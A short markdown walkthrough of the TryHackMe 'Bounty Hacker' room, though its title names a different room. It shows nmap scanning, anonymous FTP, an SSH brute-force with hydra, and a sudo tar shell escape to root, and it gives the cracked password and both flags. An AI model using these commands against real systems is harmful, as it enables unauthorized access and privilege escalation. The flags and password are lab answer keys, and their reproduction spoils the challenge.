# Vulnversity Wlakthrough
### Link
- https://tryhackme.com/room/cowboyhacker
------------------------
- Find open ports on the machine
    - sudo nmap -sC -sV -p- [IP]
        - picture: [Bounty_Hacker_1.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_1.png)
        - Port open : FTP / SSH / Web Server
        - Connect to FTP with anonymous user
        - picture: [Bounty_Hacker_2.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_2.png)
        - Download files
        - picture: [Bounty_Hacker_3.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_3.png)
        - analyze files
            - locks.txt --> password list
            - picture: [Bounty_Hacker_4.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_4.png)
            - task.txt --> we found a name "lin"
            - picture: [Bounty_Hacker_5.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_5.png)
- Who wrote the task list?
    - **Answer** : lin
- What service can you bruteforce with the text file found?
    - **Answer** : ssh
- What is the users password? 
    - Hydra
        - hydra -l lin -P locks.txt ssh://[IP]
        - picture: [Bounty_Hacker_6.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_6.png)
    - **Answer** : RedDr4gonSynd1cat3
- user.txt
    - Log with lin username/password
    - picture: [Bounty_Hacker_7.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_7.png)
    - Check the user.txt flag
    - picture: [Bounty_Hacker_8.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_8.png)
    - **Answer** : THM{CR1M3_SyNd1C4T3}
- root.txt
    - check what action are authorize with lin account
        - sudo -l
        - picture: [Bounty_Hacker_10.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_10.png)
        - /bin/tar
        - Visit https://gtfobins.github.io/#
            - Search tar
            - picture: [Bounty_Hacker_11.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_11.png)
            - Try : sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
        - Escalate root privilege
        - Verify
            - id
            - picture: [Bounty_Hacker_12.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_12.png)
        - Search root.txt
            - find / -name "root.txt" 2>/dev/null
            - picture: [Bounty_Hacker_13.png](https://github.com/LNB283/THM/blob/main/EASY/Bounty%20Hacker/Pictures/Bounty_Hacker_13.png)
    - **Answer** : THM{80UN7Y_h4cK3r}


